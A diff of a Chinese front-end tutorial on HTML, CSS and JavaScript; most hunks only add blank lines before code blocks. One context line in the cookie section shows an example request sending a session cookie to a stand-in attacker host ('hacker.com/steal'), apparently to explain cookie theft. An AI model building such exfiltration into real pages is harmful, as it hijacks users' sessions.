@@ -224,7 +224,7 @@ HTML文件的扩展名`html`或`htm`。但通常是`html`。
 13. VS Code 支持自动保存：点击**文件**菜单，然后点击**自动保存**
 
 #### 强烈建议安装的 vscode 插件
-`ctrl+``组合键，打开控制面板（dos 命令窗口）。
+`ctrl+`组合键，打开控制面板（dos 命令窗口）。
 
 然后直接将以下命令全部执行一遍，安装插件：
 
@@ -341,6 +341,7 @@ HTML 的学习可以参考官方文档：[**MDN Web Docs**](https://developer.mo
 应该把 &lt;head&gt; 标签放在文档的开始处，紧跟在 &lt;html&gt; 后面，并处于 &lt;body&gt; 标签之前。
 
 ### &lt;title&gt;标签
+
 ```html
 <head>
     <meta charset="UTF-8">
@@ -565,6 +566,7 @@ body 元素定义文档的主体，所有用户可直接看到的元素都在这
 ```
 
 #### &lt;abbr&gt;标签
+
 ```html
 <abbr title="中华人民共和国">中国</abbr> 的首都是北京。
 ```
@@ -695,6 +697,7 @@ iframe标签的属性：
 4. color指定颜色。
 
 ### &lt;span&gt;标签
+
 ```html
 <body>
     <span>这是span标签</span>
@@ -724,6 +727,7 @@ iframe标签的属性：
 
 ### 列表
 #### 无序列表
+
 ```html
 <body>
     <h1>国家列表:</h1>
@@ -750,6 +754,7 @@ iframe标签的属性：
 4. type="none" 取消项目符号
 
 #### 有序列表
+
 ```html
 <body>
     <h1>2025年手机销售排名:</h1>
@@ -1072,6 +1077,7 @@ HTML 实体字符（HTML Entities）是用于在 HTML 文档中表示特殊字�
 + 浏览器会默认将 `<thead>` 内容 **置顶显示**。
 
 ##### 示例
+
 ```html
 <table>
   <thead>
@@ -1104,6 +1110,7 @@ HTML 实体字符（HTML Entities）是用于在 HTML 文档中表示特殊字�
 + 如果未显式定义 `<tbody>`，浏览器会自动将所有非 `<thead>`/`<tfoot>` 的内容包裹在 `<tbody>` 中。
 
 ##### 示例
+
 ```html
 <table>
   <thead>...</thead>
@@ -1131,6 +1138,7 @@ HTML 实体字符（HTML Entities）是用于在 HTML 文档中表示特殊字�
 + 浏览器会默认将 `<tfoot>` 内容 **置底显示**（即使它在 HTML 中写在 `<tbody>` 之前）。
 
 ##### 示例
+
 ```html
 <table>
   <thead>
@@ -1164,6 +1172,7 @@ HTML 实体字符（HTML Entities）是用于在 HTML 文档中表示特殊字�
 + 在 HTML 中通常写在 `<tbody>` 前（但渲染时显示在底部）。
 
 #### 完整示例
+
 ```html
 <table border="1">
   <caption>2023年销售报表</caption>
@@ -1281,6 +1290,7 @@ HTTP协议是这样规定的，表单提交数据的格式为：**<font style="c
 2. 当数据不需要在页面中展示，但提交表单时需要提交。可以设置为隐藏域。
 
 #### &lt;select&gt; 下拉列表
+
 ```html
 <body>
     <form action="https://www.baidu.com">
@@ -1300,6 +1310,7 @@ HTTP协议是这样规定的，表单提交数据的格式为：**<font style="c
 3. multiple属性用来设置支持多选。（按住ctrl）。
 
 #### &lt;textarea&gt; 文本域
+
 ```html
 <body>
     <form action="https://www.baidu.com">
@@ -1421,6 +1432,7 @@ CSS是前端开发的三大基石之一（HTML+CSS+JavaScript），负责将枯�
 关于 CSS 的学习，可以参考官方文档：[**MDN Web Docs**](https://developer.mozilla.org/zh-CN/)
 
 ### CSS语法格式
+
 ```css
 选择器 {
   属性名1 : 属性值1;
@@ -1432,11 +1444,13 @@ CSS是前端开发的三大基石之一（HTML+CSS+JavaScript），负责将枯�
 
 ### 引入样式方式
 #### 内联样式
+
 ```html
 <p style="color: red; font-size: 14px">我是一个p标签</p>
 ```
 
 #### 内部样式
+
 ```css
 <style>
     body {
@@ -1635,6 +1649,7 @@ body {
 ```
 
 ##### 示例场景
+
 ```plain
 project/（网站根目录）
   ├── index.html
@@ -1672,6 +1687,7 @@ CSS选择器主要包括：
 **三者的优先级：id 选择器>class 选择器>标签选择器**
 
 #### 标签选择器
+
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -2475,6 +2491,7 @@ CSS交集选择器是由**两个选择器紧密连接组成的（中间没有空
 
 ## CSS常用属性
 ### 边框样式
+
 ```html
 <!doctype html>
 <html lang="en">
@@ -2943,6 +2960,7 @@ overflow 属性规定当内容溢出元素框时发生的事情。
 ![](https://cdn.nlark.com/yuque/0/2025/jpeg/21376908/1757681056420-39d1bc52-55fe-4f3b-8183-b4d7ba79b166.jpeg)
 
 ### 复合样式
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -3538,6 +3556,7 @@ position 属性有五个主要值：
 + 固定定位适合导航栏、侧边栏等需要常驻的元素
 
 #### 案例代码
+
 ```html
 <div class="container">
   <div class="box static">Static</div>
@@ -3611,6 +3630,7 @@ z-index 属性控制定位元素在垂直于屏幕方向（z轴）上的堆叠�
 ```
 
 #### 案例代码
+
 ```html
 <div class="container">
   <div class="box box1">Box 1</div>
@@ -3996,6 +4016,7 @@ document.body.appendChild(script);
 `defer`**与**`async`**属性**（仅限外部脚本）
 
 #### defer延迟执行
+
 ```html
 <script src="script1.js" defer></script>
 <script src="script2.js" defer></script>
@@ -4008,6 +4029,7 @@ DOM 构建完成 → (开始执行 defer 脚本) → (所有 defer 脚本执行�
 **重点注意事项：defer 脚本在执行时，已经完全可以获取页面中所有的 dom 元素了。**
 
 #### async异步加载
+
 ```html
 <script src="script1.js" async></script>
 <script src="script2.js" async></script>
@@ -4237,6 +4259,7 @@ let isActive = false;
 ```
 
 ### 类数组字面量（类似数组）
+
 ```javascript
 const arrayLike = {0:'id', 1:'name', length:2};
 ```
@@ -4367,6 +4390,7 @@ JavaScript有三种声明变量的方式：
 | `const` | 块级作用域，声明时必须初始化且不能重新赋值（ES6新增） | `const PI = 3.14159;` |
 
 #### var
+
 ```javascript
 var age = 25; // 声明并初始化
 var name;     // 声明但不初始化（默认值undefined）
@@ -4407,6 +4431,7 @@ name = "张三"; // 后续赋值
 ```
 
 #### let
+
 ```javascript
 let count = 0; // 必须使用let声明
 count = 1;     // 可以重新赋值
@@ -4435,6 +4460,7 @@ count = 1;     // 可以重新赋值
 ```
 
 #### const
+
 ```javascript
 const MAX_SIZE = 100; // 声明时必须初始化
 // MAX_SIZE = 200;    // 错误，不能重新赋值
@@ -4451,6 +4477,7 @@ user.name = "Mike";   // 允许，因为对象内部属性可以修改
 
 ### 变量的赋值和使用
 #### 基本赋值
+
 ```javascript
 let a = 10;       // 数字
 let b = "文本";    // 字符串
@@ -4459,11 +4486,13 @@ let d = null;      // 空值
 ```
 
 #### 多变量声明
+
 ```javascript
 let x = 1, y = 2, z = 3; // 一行声明多个变量
 ```
 
 #### 变量使用
+
 ```javascript
 let price = 100;
 let quantity = 5;
@@ -4472,6 +4501,7 @@ console.log(total); // 输出: 500
 ```
 
 #### 变量重新赋值
+
 ```javascript
 let score = 80;
 score = 90; // 合法（使用let声明）
@@ -4824,6 +4854,7 @@ user.say();
 定义函数后，可以通过函数名加括号来调用它：
 
 #### 直接调用
+
 ```javascript
 greet('Alice');
 ```
@@ -4856,6 +4887,7 @@ obj.sayHello();
 以上代码本质上完全相同，第二种写法就是简写方式。
 
 #### 作为构造函数调用（使用 `new`）
+
 ```javascript
 function Person(name) {
   this.name = name;
@@ -4907,6 +4939,7 @@ obj.doOther();
 ```
 
 #### 使用 call/apply 调用
+
 ```javascript
 greet.call(null, 'Charlie');
 greet.apply(null, ['Charlie']);
@@ -5269,6 +5302,7 @@ console.log(Object.prototype.toString.call({})); // '[object Object]'
 
 ### 举个最简单的例子
 #### 定义一个模块（`math.js`）
+
 ```javascript
 // math.js - 定义一个计算模块
 export function add(a, b) {  // 导出 add 函数
@@ -5279,6 +5313,7 @@ export const PI = 3.14;      // 导出 PI 常量
 ```
 
 #### 使用模块（`main.js`）
+
 ```javascript
 // main.js - 导入并使用 math.js 的功能
 // ES6模块规范中规定：路径必须以 / 或者 ./ 或者 ../ 开头【如果 / 开头表示绝对路径。如果 ./ 或者 ../ 开头表示相对路径。】
@@ -5289,6 +5324,7 @@ console.log(PI);         // 输出: 3.14
 ```
 
 #### 在 HTML 中加载模块
+
 ```html
 <script type="module" src="main.js"></script>
 <!-- 必须加上 type="module" -->
@@ -5300,6 +5336,7 @@ console.log(PI);         // 输出: 3.14
 在VS Code中搜索`Live Server`插件，然后运行程序时：`右键`->`Open with Live Server`
 
 ### 默认导出和导入
+
 ```javascript
 // 默认导出(一个文件中默认导出只能有一个)
 export default {
@@ -5316,6 +5353,7 @@ console.log(userObj.name);
 ```
 
 ### 命名导出和导入
+
 ```javascript
 // 命名导出
 export const user = {
@@ -5382,6 +5420,7 @@ console.log(user.name, user.age);
 ```
 
 ### 混合默认导入和命名导入
+
 ```javascript
 import defaultExport, { namedExport1, namedExport2 } from './module.js';
 ```
@@ -5628,6 +5667,7 @@ console.log(alice.hasOwnProperty("greet")); // false
 ```
 
 #### `instanceof` 检查对象是否是某构造函数的实例
+
 ```javascript
 function Car(make, model) {
     this.make = make;
@@ -5712,6 +5752,7 @@ JavaScript 中的控制语句可以分为以下几类：
 `for...in` 语句用于遍历对象的可枚举属性（包括继承的可枚举属性）。
 
 ##### 基本语法
+
 ```javascript
 for (variable in object) {
   // 执行的代码
@@ -5740,6 +5781,7 @@ for(var index in arr){
 **数组的遍历方式推荐：传统的 for 循环，或者 forEach 方法，或者 for..of 循环。**
 
 ##### 遍历对象属性示例
+
 ```javascript
 const obj = { a: 1, b: 2, c: 3 };
 
@@ -5761,6 +5803,7 @@ for (const key in obj) {
 `for...of` 语句用于遍历可迭代对象（如 Array, Map, Set, String, arguments 等）的值。
 
 ##### 基本语法
+
 ```javascript
 for (variable of iterable) {
   // 执行的代码
@@ -6118,6 +6161,7 @@ class MyCustomError extends Error {
 ```
 
 #### 使用自定义异常
+
 ```javascript
 function validateInput(input) {
   if (!input) {
@@ -6626,6 +6670,7 @@ console.log("场景3:", double(7)); // 14
 3. addEventListener() 方法
 
 #### HTML 内联事件属性
+
 ```html
 <button onclick="handleClick()">点击我</button>
 <script>
@@ -6636,6 +6681,7 @@ console.log("场景3:", double(7)); // 14
 ```
 
 #### DOM 属性事件处理器
+
 ```html
 <button id='myButton'>点击我</button>
 <script>
@@ -6647,6 +6693,7 @@ console.log("场景3:", double(7)); // 14
 ```
 
 #### addEventListener()方法
+
 ```html
 <button id='myButton'>点击我</button>
 <script>
@@ -6664,6 +6711,7 @@ console.log("场景3:", double(7)); // 14
 2. DOMContentLoaded：DOM 加载完成（不等待图片等资源），现代开发中推荐使用它。load 作为了解。
 
 #### window.onload
+
 ```html
 <button id='myButton'>点击我</button>
 <script>
@@ -6677,6 +6725,7 @@ console.log("场景3:", double(7)); // 14
 ```
 
 #### DOMContentLoaded
+
 ```html
 <button id='myButton'>点击我</button>
 <script>
@@ -6717,6 +6766,7 @@ console.log("场景3:", double(7)); // 14
 3. **冒泡阶段(Bubble Phase)**: 事件从目标元素向上冒泡（从内到外的过程）
 
 #### 冒泡示例
+
 ```html
 <div id="grandparent">
   <div id="parent">
@@ -6943,6 +6993,7 @@ document.getElementById('parent').addEventListener('click', function(event) {
 除了用户的操作行为之外，如果通过代码触发事件，通常包括以下两种方式：
 
 #### 手动调用事件方法
+
 ```html
 <!doctype html>
 <html lang="en">
@@ -6975,6 +7026,7 @@ document.getElementById('parent').addEventListener('click', function(event) {
 **`dispatchEvent()`****<font style="color:#DF2A3F;"> 只会触发事件监听器，但不会执行与事件关联的浏览器默认行为</font>**<font style="color:#DF2A3F;">。</font>
 
 ##### 派发事件
+
 ```javascript
 <!doctype html>
 <html lang="en">
@@ -7012,6 +7064,7 @@ document.getElementById('parent').addEventListener('click', function(event) {
 ```
 
 ##### 派发自定义事件
+
 ```html
 <button id="btn">click me</button>
 <script>
@@ -7429,6 +7482,7 @@ str.match(/^a\d/gm);  // ["a1", "a2", "a3"]
 DOM编程是指使用JavaScript来操作**文档对象模型(Document Object Model)**，从而动态地改变网页内容、结构和样式的编程方式。
 
 ### 基本DOM查询与修改
+
 ```javascript
 // 示例1：通过id获取元素并修改内容
 let header = document.getElementById('header');
@@ -7460,6 +7514,7 @@ let isMatch = element.matches('.some-class');
 ```
 
 ### 创建和添加元素
+
 ```javascript
 // 示例1：创建新元素并添加到DOM
 let newDiv = document.createElement('div');
@@ -7504,6 +7559,7 @@ document.getElementsByTagName("ul")[0].appendChild(fragment);
 ```
 
 ### 样式操作
+
 ```javascript
 // 示例1：修改元素样式
 let box = document.getElementById('box');
@@ -7527,6 +7583,7 @@ button.addEventListener('click', function() {
 ```
 
 ### 表单交互
+
 ```javascript
 // 示例1：获取表单输入值
 document.getElementById('submit-btn').addEventListener('click', function(e) {
@@ -7826,6 +7883,7 @@ textInput.addEventListener('input', function() {
 ```
 
 ### 表单验证
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -7888,6 +7946,7 @@ textInput.addEventListener('input', function() {
 ```
 
 ### 全选和取消全选
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -7920,6 +7979,7 @@ textInput.addEventListener('input', function() {
 ```
 
 ### 轮播图
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -7961,6 +8021,7 @@ textInput.addEventListener('input', function() {
 ```
 
 ### 可编辑表格
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -8111,6 +8172,7 @@ JSON的特点：
 + null
 
 ### JSON 示例
+
 ```json
 {
   "name": "张三",
@@ -8131,6 +8193,7 @@ JSON的特点：
 ```
 
 ### JS 对象转 JSON 字符串
+
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -8159,6 +8222,7 @@ JSON的特点：
 ![](https://cdn.nlark.com/yuque/0/2025/png/21376908/1750990998200-f0f5da68-7e7d-4b54-a46c-a27e936be648.png)
 
 ### JSON 字符串转 JS 对象
+
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -8310,6 +8374,7 @@ http://hacker.com/steal?cookie=sessionId=abc123; userId=456
 + **跟踪用户行为（如广告推荐）**。当用户首次访问网站时，服务器通过Set-Cookie响应头为用户分配一个唯一标识符（如user_id=abc123）。随后用户在每个页面的浏览和点击行为都会通过请求自动携带这个cookie发送到服务器，服务器将行为数据与user_id关联存储。通过分析这些累积的用户行为数据，广告系统可以构建用户兴趣画像，在后续访问中展示个性化推荐广告。
 
 #### 记住用户登录状态
+
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -8404,6 +8469,7 @@ sessionStorage.clear(); // 清空所有 sessionStorage 数据
 ![](https://cdn.nlark.com/yuque/0/2025/png/21376908/1750991786591-2b850e39-1d4f-4468-83a0-7ebd039014db.png)
 
 #### 存储复杂数据（JSON 转换）
+
 ```javascript
 const user = { name: "John", age: 30 };
 
@@ -8416,6 +8482,7 @@ console.log(storedUser.name); // "John"
 ```
 
 #### 保存用户主题偏好
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -8444,6 +8511,7 @@ console.log(storedUser.name); // "John"
 ```
 
 #### 表单草稿保存
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -8867,6 +8935,7 @@ console.log(add5(10)); // 15 (2+3+10)
 
 ### 实战练习
 #### 练习1：实现一个简单的计数器工厂
+
 ```javascript
 function createCounter() {
   // 在这里实现
@@ -8881,6 +8950,7 @@ console.log(counter2()); // 1
 ```
 
 #### 练习2：使用函数式方法处理数据
+
 ```javascript
 const users = [
   { name: "Alice", age: 25 },
@@ -9050,6 +9120,7 @@ ES6 虽然提供了 class 关键字(**语法糖**)，底层仍然是基于原型
 
 ### 对象的创建
 #### 工厂模式
+
 ```javascript
 function createPerson(name, age) {
   return {
@@ -9070,6 +9141,7 @@ person1.greet();
 **适用场景**：需要创建多个相似对象，但不需要复杂继承关系时。
 
 #### 构造函数模式（ES5常用方式）
+
 ```javascript
 function Person(name, age) {
   this.name = name;
@@ -9087,6 +9159,7 @@ person2.greet();
 **注意**：以上方式将方法定义在构造函数中，会导致每个实例都创建新方法。浪费内存。
 
 #### 原型模式（方法共享）
+
 ```javascript
 function Person(name, age) {
   this.name = name;
@@ -9104,6 +9177,7 @@ person3.greet();
 **实际应用**：这是ES5时代最常用的面向对象模式，方法共享，节省内存。
 
 #### ES6 class语法（现代开发首选）
+
 ```javascript
 class Person {
   constructor(name, age) {
@@ -9288,6 +9362,7 @@ JS 是天生的多态，因为它是弱类型的。
 在 JavaScript 中，"组合优于继承"意味着通过将小型、独立的函数或对象灵活地组合在一起来构建复杂功能，比通过继承层级扩展类更可取。组合提供了更高的灵活性、更低的耦合度，以及更好的代码复用性，允许在运行时动态调整行为，而继承则容易导致僵化的层级结构和脆弱的父类依赖。这种范式鼓励"有一个"（has-a）的关系而非"是一个"（is-a）的关系，使代码更模块化、更易于维护和扩展。
 
 #### 对象组合 + 工厂函数实现组合优于继承
+
 ```javascript
 // 1. 定义功能模块（可复用的零件）
 const canEat = {
@@ -9338,6 +9413,7 @@ duck.swim();  // 游泳
 ```
 
 #### 对比继承的痛点
+
 ```javascript
 // 继承方式（笨重）
 class Animal {
@@ -9357,6 +9433,7 @@ class Duck extends Animal {
 ```
 
 #### 更优雅的写法（ES6）
+
 ```javascript
 const eater = { eat() { console.log('吃饭'); } };
 const walker = { walk() { console.log('走路'); } };
@@ -9380,6 +9457,7 @@ const createDuck = () => ({ ...eater, ...walker, ...swimmer });
 2. **内置 Symbol 值**（如 `Symbol.iterator`）用于定义对象的默认行为（如迭代器）。
 
 ### 计算属性名语法
+
 ```javascript
 const key = 'name';
 const obj = {
@@ -9392,6 +9470,7 @@ const obj = {
 计算结果是一个字符串，这个字符串作为属性名。
 
 ### 创建 Symbol
+
 ```javascript
 const sym1 = Symbol();
 const sym2 = Symbol("description"); // 可选的描述字符串（仅用于调试）
